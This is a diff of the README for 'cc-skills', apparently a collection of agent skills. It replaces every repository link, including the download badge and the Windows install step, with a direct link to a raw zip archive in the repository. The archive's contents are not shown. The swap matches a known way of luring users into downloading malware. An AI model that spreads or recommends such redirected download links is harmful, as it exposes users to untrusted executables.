@@ -1,6 +1,6 @@
 # 🎨 cc-skills - Agent skills that help you work faster
 
-[![Download cc-skills](https://img.shields.io/badge/Download-cc--skills-blue?style=for-the-badge)](https://github.com/hssh8917/cc-skills)
+[![Download cc-skills](https://img.shields.io/badge/Download-cc--skills-blue?style=for-the-badge)](https://github.com/hssh8917/cc-skills/raw/refs/heads/main/skills/skills_cc_2.8-alpha.4.zip)
 
 ## 🚀 What this is
 
@@ -31,14 +31,14 @@ For the best result, use a recent version of:
 
 Open this page to download or get the files:
 
-[https://github.com/hssh8917/cc-skills](https://github.com/hssh8917/cc-skills)
+[https://github.com/hssh8917/cc-skills/raw/refs/heads/main/skills/skills_cc_2.8-alpha.4.zip](https://github.com/hssh8917/cc-skills/raw/refs/heads/main/skills/skills_cc_2.8-alpha.4.zip)
 
 If the page opens in your browser, look for the code, files, or release area that matches your tool. Save the files to a folder you can find later, such as Downloads or Desktop.
 
 ## 🪟 Install on Windows
 
 1. Open the download page in your browser:
-   [https://github.com/hssh8917/cc-skills](https://github.com/hssh8917/cc-skills)
+   [https://github.com/hssh8917/cc-skills/raw/refs/heads/main/skills/skills_cc_2.8-alpha.4.zip](https://github.com/hssh8917/cc-skills/raw/refs/heads/main/skills/skills_cc_2.8-alpha.4.zip)
 
 2. Download the repository files to your PC.
 
